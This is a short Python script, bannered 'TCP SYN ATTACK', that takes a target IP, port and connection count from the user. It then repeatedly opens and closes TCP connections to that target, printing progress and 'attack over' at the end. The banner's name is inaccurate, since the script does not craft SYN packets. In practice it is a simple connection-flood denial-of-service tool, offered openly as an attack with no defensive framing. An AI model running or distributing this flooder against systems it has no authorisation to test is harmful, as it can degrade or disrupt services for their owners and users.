#!/usr/bin/env python
print (" _______ _____ _____     _______     ___   _          _______ _______       _____ _  __\n"
       " |__   __/ ____|  __ \   / ____\ \   / / \ | |      /\|__   __|__   __|/\   / ____| |/ /\n"
       "    | | | |    | |__) | | (___  \ \_/ /|  \| |     /  \  | |     | |  /  \ | |    | ' / \n"
       "    | | | |    |  ___/   \___ \  \   / | . ` |    / /\ \ | |     | | / /\ \| |    |  <  \n"
       "    | | | |____| |       ____) |  | |  | |\  |   / ____ \| |     | |/ ____ \ |____| . \ \n"
       "    |_|  \_____|_|      |_____/   |_|  |_| \_|  /_/    \_\_|     |_/_/    \_\_____|_|\_\\\n"
       "                                                                                        ")

import socket

print ("IP :")
TCP_IP = input()
print ("port :")
TCP_PORT = int(input())
print("how many time ? (number of connexion)")
nb_conexion = int(input())
i = 0

while (i < nb_conexion):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TCP_IP, TCP_PORT))
    s.close()
    i = i + 1
    if (i%10 == 0):
        print(i, " connexions")
print("attack over")
